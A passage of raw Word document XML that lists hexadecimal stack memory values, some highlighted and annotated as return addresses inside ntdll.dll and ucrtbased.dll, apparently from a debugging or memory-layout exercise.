            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F648</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42DC1B74" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0000001B</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11160F67" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00200000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1659A93A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08BDE280" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>000E3203</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77A70676" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>FFFFFFFE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DAFE563" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">77A55BC3 </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>-&gt; ntdll.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FFFDF02" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">77A558D0 </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>-&gt; ntdll.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="561B139C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67CC373D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00200000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20700AC2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>4000006A</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05598807" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F78C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56C415F6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F814</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B8B58A8" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BD4FA26" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="648D6AD4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20483DEE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E7C910E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00200000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BD58566" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="296B868D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F694</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D15A9AA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000004</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="631A9B73" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F89C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0ECA6991" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">77A1E355 </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>-&gt; Ntdll.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06408A8A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>000E3203</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="750F7FB6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>FFFFFFFE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EA35011" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">77A55BC3 </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>-&gt; Ntdll.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A438C32" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">77A558D0 </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>-&gt; Ntdll.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C6622EB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000032</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55567985" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7180CF96" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75A89963" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F7D8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60115A62" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000008</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14C53F57" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000032</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E1BA8FF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00201EC8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="362F27E9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A1AF76D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>01000004</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0792EC04" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A74F9A5" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F814</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6499FE83" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0000F80C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02C5E40D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F6D4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CCA6EE1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F7F0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D0CBBBA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C8AC76D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0100E355</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2311A05A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>000E3223</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76416AFE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0020ABE2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46B28B5C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A991047" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F7D0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D12550C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F7E4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7355A4B8" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>6CB9133F</w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve"> -&gt; ucrtbased.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="379D0E52" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F3B33C9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00201EF4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D3E713F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00200000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F8B65D1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">77A56360 </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>-&gt; Ntdll.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41CDB3EE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>6E755268</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B7C835C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>676E696E</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42C8285A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13C0ECEC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B4DE69C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F7F4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2694D673" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">6CB91603 </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>-&gt; ucrtbased.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36F3C348" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40978243" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000004</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F6D2DC4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
